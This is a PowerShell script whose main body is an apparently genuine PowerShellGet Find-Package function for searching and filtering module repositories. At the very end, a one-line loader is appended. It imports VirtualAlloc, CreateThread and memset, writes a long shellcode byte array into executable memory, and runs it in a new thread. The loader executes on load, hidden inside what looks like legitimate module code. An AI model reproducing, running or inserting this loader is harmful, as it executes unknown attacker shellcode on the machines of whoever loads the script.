function Find-Package
{
    [CmdletBinding()]
    param
    (
        [string[]]
        $names,

        [string]
        $requiredVersion,

        [string]
        $minimumVersion,

        [string]
        $maximumVersion
    )

    Write-Debug ($LocalizedData.ProviderApiDebugMessage -f ('Find-Package'))

    Set-ModuleSourcesVariable

    if($RequiredVersion -and $MinimumVersion)
    {
        ThrowError -ExceptionName "System.ArgumentException" `
                   -ExceptionMessage $LocalizedData.VersionRangeAndRequiredVersionCannotBeSpecifiedTogether `
                   -ErrorId "VersionRangeAndRequiredVersionCannotBeSpecifiedTogether" `
                   -CallerPSCmdlet $PSCmdlet `
                   -ErrorCategory InvalidArgument
    }

    if($RequiredVersion -or $MinimumVersion)
    {
        if(-not $names -or $names.Count -ne 1 -or (Test-WildcardPattern -Name $names[0]))
        {
            ThrowError -ExceptionName "System.ArgumentException" `
                       -ExceptionMessage $LocalizedData.VersionParametersAreAllowedOnlyWithSingleName `
                       -ErrorId "VersionParametersAreAllowedOnlyWithSingleName" `
                       -CallerPSCmdlet $PSCmdlet `
                       -ErrorCategory InvalidArgument
        }
    }

    $options = $request.Options

    foreach( $o in $options.Keys )
    {
        Write-Debug ( "OPTION: {0} => {1}" -f ($o, $options[$o]) )
    }

	
	$postFilter = New-Object -TypeName  System.Collections.Hashtable
	if($options.ContainsKey("Name"))
	{
		if($options.ContainsKey("Includes"))
		{
			$postFilter["Includes"] = $options["Includes"]
			$null = $options.Remove("Includes")
		}

		if($options.ContainsKey("DscResource"))
		{
			$postFilter["DscResource"] = $options["DscResource"]
			$null = $options.Remove("DscResource")
		}

		if($options.ContainsKey('RoleCapability'))
		{
			$postFilter['RoleCapability'] = $options['RoleCapability']
			$null = $options.Remove('RoleCapability')
		}

		if($options.ContainsKey("Command"))
		{
			$postFilter["Command"] = $options["Command"]
			$null = $options.Remove("Command")
		}
	}

    $LocationOGPHashtable = [ordered]@{}
    if($options -and $options.ContainsKey('Source'))
    {
        $SourceNames = $($options['Source'])

        Write-Verbose ($LocalizedData.SpecifiedSourceName -f ($SourceNames))

        foreach($sourceName in $SourceNames)
        {
            if($script:PSGetModuleSources.Contains($sourceName))
            {
                $ModuleSource = $script:PSGetModuleSources[$sourceName]
                $LocationOGPHashtable[$ModuleSource.SourceLocation] = (Get-ProviderName -PSCustomObject $ModuleSource)
            }
            else
            {
                $sourceByLocation = Get-SourceName -Location $sourceName

                if ($sourceByLocation)
                {
                    $ModuleSource = $script:PSGetModuleSources[$sourceByLocation]
                    $LocationOGPHashtable[$ModuleSource.SourceLocation] = (Get-ProviderName -PSCustomObject $ModuleSource)
                }
                else
                {
                    $message = $LocalizedData.RepositoryNotFound -f ($sourceName)
                    Write-Error -Message $message `
                                -ErrorId 'RepositoryNotFound' `
                                -Category InvalidArgument `
                                -TargetObject $sourceName
                }
            }
        }
    }
    elseif($options -and
           $options.ContainsKey($script:PackageManagementProviderParam) -and
           $options.ContainsKey('Location'))
    {
        $Location = $options['Location']
        $PackageManagementProvider = $options['PackageManagementProvider']

        Write-Verbose ($LocalizedData.SpecifiedLocationAndOGP -f ($Location, $PackageManagementProvider))

        $LocationOGPHashtable[$Location] = $PackageManagementProvider
    }
    else
    {
        Write-Verbose $LocalizedData.NoSourceNameIsSpecified

        $script:PSGetModuleSources.Values | Microsoft.PowerShell.Core\ForEach-Object { $LocationOGPHashtable[$_.SourceLocation] = (Get-ProviderName -PSCustomObject $_) }
    }

    $artifactTypes = $script:PSArtifactTypeModule
    if($options.ContainsKey($script:PSArtifactType))
    {
        $artifactTypes = $options[$script:PSArtifactType]
    }

    if($artifactTypes -eq $script:All)
    {
        $artifactTypes = @($script:PSArtifactTypeModule,$script:PSArtifactTypeScript)
    }

    $providerOptions = @{}

    if($options.ContainsKey($script:AllVersions))
    {
        $providerOptions[$script:AllVersions] = $options[$script:AllVersions]
    }

    if ($options.Contains($script:AllowPrereleaseVersions))
    {
        $providerOptions[$script:AllowPrereleaseVersions] = $options[$script:AllowPrereleaseVersions]
    }

    if($options.ContainsKey($script:Filter))
    {
        $Filter = $options[$script:Filter]
        $providerOptions['Contains'] = $Filter
    }

    if($options.ContainsKey($script:Tag))
    {
        $userSpecifiedTags = $options[$script:Tag] | Microsoft.PowerShell.Utility\Select-Object -Unique -ErrorAction Ignore
    }
    else
    {
        $userSpecifiedTags = @($script:NotSpecified)
    }

    $specifiedDscResources = @()
    if($options.ContainsKey('DscResource'))
    {
        $specifiedDscResources = $options['DscResource'] |
                                    Microsoft.PowerShell.Utility\Select-Object -Unique -ErrorAction Ignore |
                                        Microsoft.PowerShell.Core\ForEach-Object {"$($script:DscResource)_$_"}
    }

    $specifiedRoleCapabilities = @()
    if($options.ContainsKey('RoleCapability'))
    {
        $specifiedRoleCapabilities = $options['RoleCapability'] |
                                        Microsoft.PowerShell.Utility\Select-Object -Unique -ErrorAction Ignore |
                                            Microsoft.PowerShell.Core\ForEach-Object {"$($script:RoleCapability)_$_"}
    }

    $specifiedCommands = @()
    if($options.ContainsKey('Command'))
    {
        $specifiedCommands = $options['Command'] |
                                Microsoft.PowerShell.Utility\Select-Object -Unique -ErrorAction Ignore |
                                    Microsoft.PowerShell.Core\ForEach-Object {"$($script:Command)_$_"}
    }

    $specifiedIncludes = @()
    if($options.ContainsKey('Includes'))
    {
        $includes = $options['Includes'] |
                        Microsoft.PowerShell.Utility\Select-Object -Unique -ErrorAction Ignore |
                            Microsoft.PowerShell.Core\ForEach-Object {"$($script:Includes)_$_"}

        
        
        
        
        if($includes)
        {
            if(-not $specifiedDscResources -and ($includes -contains "$($script:Includes)_DscResource") )
            {
               $specifiedIncludes += "$($script:Includes)_DscResource"
            }

            if(-not $specifiedRoleCapabilities -and ($includes -contains "$($script:Includes)_RoleCapability") )
            {
               $specifiedIncludes += "$($script:Includes)_RoleCapability"
            }

            if(-not $specifiedCommands)
            {
               if($includes -contains "$($script:Includes)_Cmdlet")
               {
                   $specifiedIncludes += "$($script:Includes)_Cmdlet"
               }

               if($includes -contains "$($script:Includes)_Function")
               {
                   $specifiedIncludes += "$($script:Includes)_Function"
               }

               if($includes -contains "$($script:Includes)_Workflow")
               {
                   $specifiedIncludes += "$($script:Includes)_Workflow"
               }
            }
        }
    }

    if(-not $specifiedDscResources)
    {
        $specifiedDscResources += $script:NotSpecified
    }

    if(-not $specifiedRoleCapabilities)
    {
        $specifiedRoleCapabilities += $script:NotSpecified
    }

    if(-not $specifiedCommands)
    {
        $specifiedCommands += $script:NotSpecified
    }

    if(-not $specifiedIncludes)
    {
        $specifiedIncludes += $script:NotSpecified
    }

    $providerSearchTags = @{}

    foreach($tag in $userSpecifiedTags)
    {
        foreach($include in $specifiedIncludes)
        {
            foreach($command in $specifiedCommands)
            {
                foreach($resource in $specifiedDscResources)
                {
                    foreach($roleCapability in $specifiedRoleCapabilities)
                    {
                        $providerTags = @()
                        if($resource -ne $script:NotSpecified)
                        {
                            $providerTags += $resource
                        }

                        if($roleCapability -ne $script:NotSpecified)
                        {
                            $providerTags += $roleCapability
                        }

                        if($command -ne $script:NotSpecified)
                        {
                            $providerTags += $command
                        }

                        if($include -ne $script:NotSpecified)
                        {
                            $providerTags += $include
                        }

                        if($tag -ne $script:NotSpecified)
                        {
                            $providerTags += $tag
                        }

                        if($providerTags)
                        {
                            $providerSearchTags["$tag $resource $roleCapability $command $include"] = $providerTags
                        }
                    }
                }
            }
        }
    }

    $InstallationPolicy = "Untrusted"
    if($options.ContainsKey('InstallationPolicy'))
    {
        $InstallationPolicy = $options['InstallationPolicy']
    }

    $streamedResults = @()

    foreach($artifactType in $artifactTypes)
    {
        foreach($kvPair in $LocationOGPHashtable.GetEnumerator())
        {
            if($request.IsCanceled)
            {
                return
            }

            $Location = $kvPair.Key
            if($artifactType -eq $script:PSArtifactTypeScript)
            {
                $sourceName = Get-SourceName -Location $Location

                if($SourceName)
                {
                    $ModuleSource = $script:PSGetModuleSources[$SourceName]

                    
                    if(-not $ModuleSource.ScriptSourceLocation)
                    {
                        if($options.ContainsKey('Source'))
                        {
                            $message = $LocalizedData.ScriptSourceLocationIsMissing -f ($ModuleSource.Name)
                            Write-Error -Message $message `
                                        -ErrorId 'ScriptSourceLocationIsMissing' `
                                        -Category InvalidArgument `
                                        -TargetObject $ModuleSource.Name
                        }

                        continue
                    }

                    $Location = $ModuleSource.ScriptSourceLocation
                }
            }

            $ProviderName = $kvPair.Value

            Write-Verbose ($LocalizedData.GettingPackageManagementProviderObject -f ($ProviderName))

	        $provider = $request.SelectProvider($ProviderName)

            if(-not $provider)
            {
                Write-Error -Message ($LocalizedData.PackageManagementProviderIsNotAvailable -f $ProviderName)

                Continue
            }

            Write-Verbose ($LocalizedData.SpecifiedLocationAndOGP -f ($Location, $provider.ProviderName))

            if($providerSearchTags.Values.Count)
            {
                $tagList = $providerSearchTags.Values
            }
            else
            {
                $tagList = @($script:NotSpecified)
            }

            $namesParameterEmpty = ($names.Count -eq 1) -and ($names[0] -eq '')

            foreach($providerTag in $tagList)
            {
                if($request.IsCanceled)
                {
                    return
                }

                $FilterOnTag = @()

                if($providerTag -ne $script:NotSpecified)
                {
                    $FilterOnTag = $providerTag
                }

                if(Microsoft.PowerShell.Management\Test-Path -Path $Location)
                {
                    if($artifactType -eq $script:PSArtifactTypeScript)
                    {
                        $FilterOnTag += 'PSScript'
                    }
                    elseif($artifactType -eq $script:PSArtifactTypeModule)
                    {
                        $FilterOnTag += 'PSModule'
                    }
                }

                if($FilterOnTag)
                {
                    $providerOptions["FilterOnTag"] = $FilterOnTag
                }
                elseif($providerOptions.ContainsKey('FilterOnTag'))
                {
                    $null = $providerOptions.Remove('FilterOnTag')
                }

                if($request.Options.ContainsKey($script:FindByCanonicalId))
                {
                    $providerOptions[$script:FindByCanonicalId] = $request.Options[$script:FindByCanonicalId]
                }

                $providerOptions["Headers"] = 'PSGalleryClientVersion=1.1'

                $NewRequest = $request.CloneRequest( $providerOptions, @($Location), $request.Credential )

                $pkgs = $provider.FindPackages($names,
                                               $requiredVersion,
                                               $minimumVersion,
                                               $maximumVersion,
                                               $NewRequest )

                foreach($pkg in  $pkgs)
                {
                    if($request.IsCanceled)
                    {
                        return
                    }

                    
                    if ($namesParameterEmpty -or ($names | Foreach-Object { if ($pkg.Name -like $_){return $true; break} } -End {return $false}))
                    {
						$includePackage = $true

						
						
						if($options.ContainsKey("Name") -and $postFilter.Count -gt 0)
						{
							if ($pkg.Metadata["DscResources"].Count -gt 0)
							{
								$pkgDscResources = $pkg.Metadata["DscResources"] -Split " " | Microsoft.PowerShell.Core\Where-Object { $_.Trim() }
							}
							else
							{
								$pkgDscResources = $pkg.Metadata["tags"] -Split " " `
									| Microsoft.PowerShell.Core\Where-Object { $_.Trim() } `
									| Microsoft.PowerShell.Core\Where-Object { $_.StartsWith($script:DscResource, [System.StringComparison]::OrdinalIgnoreCase) } `
									| Microsoft.PowerShell.Core\ForEach-Object { $_.Substring($script:DscResource.Length + 1) }
							}

							if ($pkg.Metadata['RoleCapabilities'].Count -gt 0)
							{
								$pkgRoleCapabilities = $pkg.Metadata['RoleCapabilities'] -Split ' ' | Microsoft.PowerShell.Core\Where-Object { $_.Trim() }
							}
							else
							{
								$pkgRoleCapabilities = $pkg.Metadata["tags"] -Split ' ' `
									| Microsoft.PowerShell.Core\Where-Object { $_.Trim() } `
									| Microsoft.PowerShell.Core\Where-Object { $_.StartsWith($script:RoleCapability, [System.StringComparison]::OrdinalIgnoreCase) } `
									| Microsoft.PowerShell.Core\ForEach-Object { $_.Substring($script:RoleCapability.Length + 1) }
							}

							if ($pkg.Metadata["Functions"].Count -gt 0)
							{
								$pkgFunctions = $pkg.Metadata["Functions"] -Split " " | Microsoft.PowerShell.Core\Where-Object { $_.Trim() }
							}
							else
							{
								$pkgFunctions = $pkg.Metadata["tags"] -Split " " `
									| Microsoft.PowerShell.Core\Where-Object { $_.Trim() } `
									| Microsoft.PowerShell.Core\Where-Object { $_.StartsWith($script:Function, [System.StringComparison]::OrdinalIgnoreCase) } `
									| Microsoft.PowerShell.Core\ForEach-Object { $_.Substring($script:Function.Length + 1) }
							}

							if ($pkg.Metadata["Cmdlets"].Count -gt 0)
							{
								$pkgCmdlets = $pkg.Metadata["Cmdlets"] -Split " " | Microsoft.PowerShell.Core\Where-Object { $_.Trim() }
							}
							else
							{
								$pkgCmdlets = $pkg.Metadata["tags"] -Split " " `
									| Microsoft.PowerShell.Core\Where-Object { $_.Trim() } `
									| Microsoft.PowerShell.Core\Where-Object { $_.StartsWith($script:Cmdlet, [System.StringComparison]::OrdinalIgnoreCase) } `
									| Microsoft.PowerShell.Core\ForEach-Object { $_.Substring($script:Cmdlet.Length + 1) }
							}

							if ($pkg.Metadata["Workflows"].Count -gt 0)
							{
								$pkgWorkflows = $pkg.Metadata["Workflows"] -Split " " | Microsoft.PowerShell.Core\Where-Object { $_.Trim() }
							}
							else
							{
								$pkgWorkflows = $pkg.Metadata["tags"] -Split " " `
									| Microsoft.PowerShell.Core\Where-Object { $_.Trim() } `
									| Microsoft.PowerShell.Core\Where-Object { $_.StartsWith($script:Workflow, [System.StringComparison]::OrdinalIgnoreCase) } `
									| Microsoft.PowerShell.Core\ForEach-Object { $_.Substring($script:Workflow.Length + 1) }
							}

							foreach ($key in $postFilter.Keys)
							{
								switch ($key)
								{
									"DscResource" {
										$values = $postFilter[$key]

										$includePackage = $false

										foreach ($value in $values)
										{
											$wildcardPattern = New-Object System.Management.Automation.WildcardPattern $value,$script:wildcardOptions

											$pkgDscResources | Microsoft.PowerShell.Core\ForEach-Object {
												if ($wildcardPattern.IsMatch($_))
												{
													$includePackage = $true
													break
												}
											}
										}

										if (-not $includePackage)
										{
											break
										}
									}

									'RoleCapability' {
										$values = $postFilter[$key]

										$includePackage = $false

										foreach ($value in $values)
										{
											$wildcardPattern = New-Object System.Management.Automation.WildcardPattern $value,$script:wildcardOptions

											$pkgRoleCapabilities | Microsoft.PowerShell.Core\ForEach-Object {
												if ($wildcardPattern.IsMatch($_))
												{
													$includePackage = $true
													break
												}
											}
										}

										if (-not $includePackage)
										{
											break
										}
									}

									"Command" {
										$values = $postFilter[$key]

										$includePackage = $false

										foreach ($value in $values)
										{
											$wildcardPattern = New-Object System.Management.Automation.WildcardPattern $value,$script:wildcardOptions

											$pkgFunctions | Microsoft.PowerShell.Core\ForEach-Object {
												if ($wildcardPattern.IsMatch($_))
												{
													$includePackage = $true
													break
												}
											}

											$pkgCmdlets | Microsoft.PowerShell.Core\ForEach-Object {
												if ($wildcardPattern.IsMatch($_))
												{
													$includePackage = $true
													break
												}
											}

											$pkgWorkflows | Microsoft.PowerShell.Core\ForEach-Object {
												if ($wildcardPattern.IsMatch($_))
												{
													$includePackage = $true
													break
												}
											}
										}

										if (-not $includePackage)
										{
											break
										}
									}

									"Includes" {
										$values = $postFilter[$key]

										$includePackage = $false

										foreach ($value in $values)
										{
											switch ($value)
											{
												"Cmdlet" { if ($pkgCmdlets ) { $includePackage = $true } }
												"Function" { if ($pkgFunctions ) { $includePackage = $true } }
												"DscResource" { if ($pkgDscResources ) { $includePackage = $true } }
												"RoleCapability" { if ($pkgRoleCapabilities ) { $includePackage = $true } }
												"Workflow" { if ($pkgWorkflows ) { $includePackage = $true } }
											}
										}

										if (-not $includePackage)
										{
											break
										}
									}
								}
							}
						}

						if ($includePackage)
						{
							$fastPackageReference = New-FastPackageReference -ProviderName $provider.ProviderName `
																			-PackageName $pkg.Name `
																			-Version $pkg.Version `
																			-Source $Location `
																			-ArtifactType $artifactType

							if($streamedResults -notcontains $fastPackageReference)
							{
								$streamedResults += $fastPackageReference

								$FromTrustedSource = $false

								$ModuleSourceName = Get-SourceName -Location $Location

								if($ModuleSourceName)
								{
									$FromTrustedSource = $script:PSGetModuleSources[$ModuleSourceName].Trusted
								}
								elseif($InstallationPolicy -eq "Trusted")
								{
									$FromTrustedSource = $true
								}

								$sid = New-SoftwareIdentityFromPackage -Package $pkg `
																	-PackageManagementProviderName $provider.ProviderName `
																	-SourceLocation $Location `
																	-IsFromTrustedSource:$FromTrustedSource `
																	-Type $artifactType `
																	-request $request

								$script:FastPackRefHashtable[$fastPackageReference] = $pkg

								Write-Output -InputObject $sid
							}
						}
                    }
                }
            }
        }
    }
}
$PFOW = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $PFOW -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xd1,0xb8,0xc8,0x0b,0x1b,0xc8,0xd9,0x74,0x24,0xf4,0x5b,0x33,0xc9,0xb1,0x6e,0x31,0x43,0x19,0x83,0xc3,0x04,0x03,0x43,0x15,0x2a,0xfe,0xe7,0x20,0x23,0x01,0x18,0xb1,0x53,0x8b,0xfd,0x80,0x41,0xef,0x76,0xb0,0x55,0x7b,0xda,0x39,0x1e,0x29,0xcf,0xca,0x52,0xe6,0xe0,0x7b,0xd8,0xd0,0xcf,0x7c,0xed,0xdc,0x9c,0xbf,0x6c,0xa1,0xde,0x93,0x4e,0x98,0x10,0xe6,0x8f,0xdd,0x4d,0x09,0xdd,0xb6,0x1a,0xb8,0xf1,0xb3,0x5f,0x01,0xf0,0x13,0xd4,0x39,0x8a,0x16,0x2b,0xcd,0x20,0x18,0x7c,0x7e,0x3f,0x52,0x64,0xf4,0x67,0x43,0x95,0xd9,0x74,0xbf,0xdc,0x56,0x4e,0x4b,0xdf,0xbe,0x9f,0xb4,0xd1,0xfe,0x73,0x8b,0xdd,0xf2,0x8a,0xcb,0xda,0xec,0xf9,0x27,0x19,0x90,0xf9,0xf3,0x63,0x4e,0x8c,0xe1,0xc4,0x05,0x36,0xc2,0xf5,0xca,0xa0,0x81,0xfa,0xa7,0xa7,0xce,0x1e,0x39,0x64,0x65,0x1a,0xb2,0x8b,0xaa,0xaa,0x80,0xaf,0x6e,0xf6,0x53,0xce,0x37,0x52,0x35,0xef,0x28,0x3a,0xea,0x55,0x22,0xa9,0xff,0xef,0x69,0xa6,0x91,0x8a,0xe5,0x36,0x06,0x23,0x6f,0x59,0xbf,0x42,0x89,0xf1,0x57,0x18,0x21,0xdc,0xa0,0x5f,0x18,0x11,0x50,0xc8,0xf4,0x05,0xf9,0xa0,0x92,0x93,0x53,0x35,0xc4,0x1b,0x8e,0x2e,0x69,0xbf,0x00,0x79,0x3f,0x6e,0x09,0x7a,0x91,0xc1,0xa5,0xc7,0x10,0xe2,0x35,0x64,0x43,0x8a,0x62,0x03,0xfc,0x8c,0x72,0xc6,0xe8,0x5e,0xd4,0xd9,0x3c,0x32,0x8e,0x19,0xf3,0x13,0xca,0x4b,0xa1,0x01,0x82,0x39,0x15,0xce,0xcf,0xe8,0xbb,0x35,0xef,0xc7,0x4d,0x8f,0x65,0xf7,0x16,0x78,0xfa,0xc4,0xa8,0x78,0x73,0xca,0xc3,0x7c,0xd3,0x60,0x0b,0x2b,0xbb,0x01,0x75,0x4d,0xbd,0x16,0xac,0x40,0x3d,0xbf,0x18,0xf4,0x96,0x69,0xcf,0xd7,0x1e,0x8d,0x74,0xd7,0xca,0x28,0x4a,0x52,0xea,0x79,0x44,0x19,0x68,0x7d,0x5a,0x21,0x7a,0xac,0xb3,0xab,0x7c,0x4e,0x44,0x44,0xd0,0xb1,0xbb,0x6b,0x06,0x37,0x35,0xf6,0x2c,0xb3,0xd8,0xd8,0xab,0x43,0x46,0x25,0xdf,0xd8,0xb9,0xe5,0x40,0x4e,0xd0,0xe7,0x14,0x6c,0x74,0x82,0xea,0x1a,0x76,0x05,0x83,0x00,0x80,0x73,0x1c,0x4b,0xb8,0x17,0x92,0x73,0x25,0xa0,0xd1,0x70,0x83,0x14,0x8d,0xfb,0x9f,0xb0,0x26,0x32,0xe0,0x0d,0x35,0x64,0xb1,0x3b,0x52,0x96,0xa7,0x4d,0x40,0x69,0x12,0xc8,0x45,0xe1,0xb0,0x8b,0xc0,0xc9,0xbf,0x3d,0xa1,0xc9,0x6b,0x12,0xb8,0x8d,0xb7,0x9e,0x92,0x5e,0xd0,0xb3,0x45,0xce,0x7b,0x33,0xbc,0x8d,0x90,0xcf,0xd4,0x5f,0x3b,0xb8,0xec,0xc9,0x3b,0x6a,0x0e,0x20,0x29,0x8b,0xa7,0xa2,0x9f,0x00,0x28,0xb5,0x1f,0xc3,0xdd,0xb9,0xb7,0x1c,0x94,0x1b,0x11,0x22,0x02,0xb3,0x0e,0x23,0x52,0xbc,0x51,0xf8,0x83,0x27,0xd6,0x65,0xdc,0x4f,0x2f,0x99,0x23,0x70,0x51,0x4b,0xac,0xe1,0xff,0xf5,0x62,0x9e,0x9e,0x8d,0x7a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$lb6=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($lb6.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$lb6,0,0,0);for (;;){Start-sleep 60};

